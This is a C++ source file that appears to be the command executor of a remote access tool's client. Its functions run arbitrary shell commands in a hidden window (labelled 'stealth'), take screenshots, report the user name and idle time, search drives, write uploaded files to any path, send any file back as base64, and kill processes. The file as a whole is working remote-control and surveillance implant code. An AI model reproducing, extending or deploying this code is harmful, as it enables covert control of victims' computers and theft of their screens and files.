#include <vector>
#include <string>
#include <fstream>
#include <map>
#include <algorithm>
#include <iostream>
#include <iomanip>
#include <sstream>
#include <time.h>
#include "../common/utils.h" // Includes winsock2.h and windows.h in correct order
#include "executor.h"

#ifdef _WIN32
#include <tlhelp32.h>
#include <shlobj.h>
#include <psapi.h>
#include <commctrl.h>
#include <gdiplus.h>
#ifdef _MSC_VER
#pragma comment(lib, "gdiplus.lib")
#endif
using namespace Gdiplus;
#else
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <limits.h>
#endif

#ifdef _WIN32
// Helper for tasks list
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        char title[MAX_PATH];
        if (GetWindowTextA(hwnd, title, sizeof(title)) > 0) {
            std::vector<WindowInfo>* list = (std::vector<WindowInfo>*)lParam;
            WindowInfo info;
            info.pid = pid;
            strncpy(info.title, title, MAX_PATH);
            list->push_back(info);
        }
    }
    return TRUE;
}

// Helper to find the Encoder CLSID for GDI+
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;
    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

// Stealth Command Execution without CMD Flicker
std::string RunStealthCommand(const std::string& cmd) {
    // Check command length to prevent buffer overflow
    if (cmd.length() > 8000) { // Windows CMD limit is around 8191
        return "ERR_CMD_TOO_LONG";
    }

    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "ERR_PIPE";

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    std::string fullCmd = "cmd.exe /c \"" + cmd + "\"";
    char* cmdBuf = _strdup(fullCmd.c_str());

    if (!CreateProcessA(NULL, cmdBuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        free(cmdBuf);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return "ERR_EXEC";
    }

    free(cmdBuf);
    CloseHandle(hWrite);

    std::string result;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    WaitForSingleObject(pi.hProcess, 5000); // 5s timeout
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return result;
}
#endif

void RecursiveSearch(const std::string& directory, const std::string& pattern, std::string& result, int& count, int maxCount) {
    if (count >= maxCount) return;
    std::string searchPath = directory + "\\*";
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        std::string fileName = ffd.cFileName;
        if (fileName == "." || fileName == "..") continue;
        std::string fullPath = directory + "\\" + fileName;
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            RecursiveSearch(fullPath, pattern, result, count, maxCount);
        } else {
            if (pattern == "*" || pattern == "*.*") {
                result += fullPath + "\n";
                count++;
            } else if (fileName.find(pattern.substr(pattern.find_first_not_of("*."))) != std::string::npos) {
                result += fullPath + "\n";
                count++;
            }
        }
    } while (FindNextFileA(hFind, &ffd) && count < maxCount);
    FindClose(hFind);
}

std::string Executor::GetCurrentDir() {
#ifdef _WIN32
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    return std::string(buffer);
#else
    char buffer[PATH_MAX];
    if (getcwd(buffer, sizeof(buffer)) != NULL) return std::string(buffer);
    return "Unknown";
#endif
}

std::string Executor::ExecuteCommand(const std::string& command) {
    // Log command execution start
    LogToFile("../bin/logs/client.log", "[*] Executing command: " + command);

    std::string cmd = command;
    size_t trailing = cmd.find_last_not_of(" \n\r\t");
    if (trailing != std::string::npos) cmd = cmd.substr(0, trailing + 1);

    if (cmd == "tasks") {
#ifdef _WIN32
        std::vector<WindowInfo> windows;
        EnumWindows(EnumWindowsProc, (LPARAM)&windows);
        std::string json = "[\n";
        for (size_t i = 0; i < windows.size(); i++) {
            json += "  {\"pid\": " + std::to_string(windows[i].pid) + ", \"name\": \"" + JsonEscape(windows[i].title) + "\"}";
            if (i < windows.size() - 1) json += ",\n";
        }
        json += "\n]";
        return json;
#endif
    }

    if (cmd == "sysinfo") {
#ifdef _WIN32
        std::ostringstream os;
        os << "{\n";
        std::string osName = "Windows Unknown";
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char prodName[128];
            DWORD size = sizeof(prodName);
            if (RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)prodName, &size) == ERROR_SUCCESS) { osName = prodName; }
            RegCloseKey(hKey);
        }
        os << "  \"OS\": \"" << osName << "\",\n";
        MEMORYSTATUSEX mem;
        memset(&mem, 0, sizeof(mem));
        mem.dwLength = sizeof(mem);
        GlobalMemoryStatusEx(&mem);
        os << "  \"RAMUsage\": \"" << (int)((mem.ullTotalPhys - mem.ullAvailPhys) / (1024 * 1024)) << "/" << (int)(mem.ullTotalPhys / (1024 * 1024)) << " MB\",\n";
        SYSTEM_INFO si;
        memset(&si, 0, sizeof(si));
        GetNativeSystemInfo(&si);
        os << "  \"CPU\": \"" << si.dwNumberOfProcessors << " Cores (Arch " << si.wProcessorArchitecture << ")\",\n";
        SYSTEM_POWER_STATUS sps;
        memset(&sps, 0, sizeof(sps));
        GetSystemPowerStatus(&sps);
        os << "  \"Battery\": \"" << (int)sps.BatteryLifePercent << "% (" << (sps.ACLineStatus == 1 ? "Charging" : "Discharging") << ")\",\n";
        DWORD uptime = (DWORD)(GetTickCount64() / 1000);
        LASTINPUTINFO lii;
        memset(&lii, 0, sizeof(lii));
        lii.cbSize = sizeof(lii);
        GetLastInputInfo(&lii);
        DWORD idle = (DWORD)((GetTickCount64() - lii.dwTime) / 1000);
        os << "  \"Uptime\": \"" << (int)(uptime / 60) << "m\",\n";
        os << "  \"IdleTime\": \"" << (int)idle << "s\",\n";
        char username[MAX_PATH];
        DWORD usize = MAX_PATH;
        GetUserNameA(username, &usize);
        os << "  \"User\": \"" << username << "\"\n";
        os << "}";
        return os.str();
#endif
    }

    if (cmd == "screenshot") {
#ifdef _WIN32
        // INITIALIZE GDI+ (JPG COMPRESSION)
        GdiplusStartupInput gdiplusStartupInput;
        ULONG_PTR gdiplusToken;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        int sx = GetSystemMetrics(SM_CXSCREEN);
        int sy = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, sx, sy);
        SelectObject(hDC, hBitmap);
        BitBlt(hDC, 0, 0, sx, sy, hScreen, 0, 0, SRCCOPY);
        
        std::string result;
        {
            Bitmap gdiBitmap(hBitmap, NULL);
            IStream* pStream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                CLSID jpgClsid;
                if (GetEncoderClsid(L"image/jpeg", &jpgClsid) != -1) {
                    EncoderParameters encoderParameters;
                    encoderParameters.Count = 1;
                    encoderParameters.Parameter[0].Guid = EncoderQuality;
                    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
                    encoderParameters.Parameter[0].NumberOfValues = 1;
                    long quality = 75;
                    encoderParameters.Parameter[0].Value = &quality;

                    if (gdiBitmap.Save(pStream, &jpgClsid, &encoderParameters) == Ok) {
                        HGLOBAL hGlobal = NULL;
                        if (GetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
                            void* pData = GlobalLock(hGlobal);
                            if (pData) {
                                size_t size = GlobalSize(hGlobal);
                                std::string raw((char*)pData, size);
                                GlobalUnlock(hGlobal);
                                result = Base64Encode(raw);
                            }
                        }
                    }
                }
                pStream->Release();
            }
        }

        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        GdiplusShutdown(gdiplusToken);
        return result.empty() ? "ERR_JPG_CAPTURE" : result;
#endif
    }
    
    if (cmd.substr(0, 7) == "search ") {
#ifdef _WIN32
        std::string pattern = cmd.substr(7);
        std::string results = "";
        int count = 0;
        char root[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, root);
        RecursiveSearch(root, pattern, results, count, 50);
        if (results.empty()) return "NO_FILES_FOUND";
        return results;
#endif
    }

    if (cmd == "drives") {
        std::string json = "[\n";
#ifdef _WIN32
        char drives[256];
        GetLogicalDriveStringsA(sizeof(drives), drives);
        char* d = drives;
        bool first = true;
        while (*d) {
            if (!first) json += ",\n";
            ULARGE_INTEGER free, total, avail;
            GetDiskFreeSpaceExA(d, &avail, &total, &free);
            
            double totalGB = (double)total.QuadPart / (1024.0 * 1024.0 * 1024.0);
            double freeGB = (double)free.QuadPart / (1024.0 * 1024.0 * 1024.0);
            
            std::ostringstream ds;
            ds << std::fixed << std::setprecision(1);
            ds << "  { \"path\": \"" << d << "\", \"total\": \"" << totalGB << "GB\", \"free\": \"" << freeGB << "GB\" }";
            json += ds.str();
            
            d += strlen(d) + 1;
            first = false;
        }
#endif
        json += "\n]";
        return json;
    }

    if (cmd.substr(0, 3) == "cd ") {
        std::string path = cmd.substr(3);
        if (path[0] == '\"' && path.back() == '\"') path = path.substr(1, path.length() - 2);
#ifdef _WIN32
        if (SetCurrentDirectoryA(path.c_str())) return "OK";
#else
        if (chdir(path.c_str()) == 0) return "OK";
#endif
        return "ERR_CD";
    }

    if (cmd.substr(0, 8) == ":upload ") {
        std::string data = cmd.substr(8);
        size_t sep = data.find(' ');
        if (sep == std::string::npos) return "ERR_UPLOAD_ARGS";
        std::string remotePath = data.substr(0, sep);
        std::string payload = data.substr(sep + 1);
        size_t pSep = payload.find('|');
        std::string b64 = (pSep != std::string::npos) ? payload.substr(0, pSep) : payload;
        std::string filename = (pSep != std::string::npos) ? payload.substr(pSep + 1) : "";
        
        std::string content = Base64Decode(b64);

#ifdef _WIN32
        // ROBUST PATH JOINING: If remotePath is a directory, append filename
        DWORD attrib = GetFileAttributesA(remotePath.c_str());
        if (attrib != INVALID_FILE_ATTRIBUTES && (attrib & FILE_ATTRIBUTE_DIRECTORY)) {
            if (!remotePath.empty() && remotePath.back() != '\\' && remotePath.back() != '/') {
                remotePath += "\\";
            }
            remotePath += filename;
        }

        // AUTO-CREATE DIRECTORY: Ensure parent exists
        size_t lastSlash = remotePath.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            std::string parent = remotePath.substr(0, lastSlash);
            SHCreateDirectoryExA(NULL, parent.c_str(), NULL);
        }
#endif

        std::ofstream out(remotePath, std::ios::binary);
        if (out.is_open()) {
            out.write(content.data(), content.size());
            out.close();
            LogToFile("../bin/logs/client.log", "[+] File uploaded successfully: " + remotePath);
            return "SUCCESS_UPLOAD";
        }
        LogToFile("../bin/logs/client.log", "[-] Failed to upload file: " + remotePath);
        return "ERR_FILE_WRITE|||" + GetCurrentDir();
    }

    if (cmd.substr(0, 10) == ":download ") {
        std::string path = cmd.substr(10);
        std::ifstream in(path, std::ios::binary);
        if (!in.is_open()) {
            LogToFile("../bin/logs/client.log", "[-] Failed to download file: " + path);
            return "ERR_FILE_READ";
        }
        std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        LogToFile("../bin/logs/client.log", "[+] File downloaded successfully: " + path + " (" + std::to_string(content.size()) + " bytes)");
        return "[BASE64]" + Base64Encode(content);
    }

    if (cmd.substr(0, 5) == "stop ") {
        std::string target = cmd.substr(5);
#ifdef _WIN32
        std::string command;
        if (target.find_first_not_of("0123456789") == std::string::npos) {
            command = "taskkill /F /T /PID " + target;
        } else {
            command = "taskkill /F /T /IM " + target;
        }
        std::string res = RunStealthCommand(command);
        // Check for success indicators in taskkill output
        if (res.find("SUCCESS") != std::string::npos || res.find("successfully") != std::string::npos || res.empty()) {
            LogToFile("../bin/logs/client.log", "[+] Process killed successfully: " + target);
            return "OK";
        } else {
            LogToFile("../bin/logs/client.log", "[-] Failed to kill process: " + target + " - " + res);
            return "ERR_STOP_FAILED";
        }
#endif
    }

#ifdef _WIN32
    return RunStealthCommand(cmd);
#else
    std::string result;
    char buffer[128];
    FILE* pipe = popen((cmd + " 2>&1").c_str(), "r");
    if (!pipe) return "ERR_PIPE";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) result += buffer;
    pclose(pipe);
    return result;
#endif
}
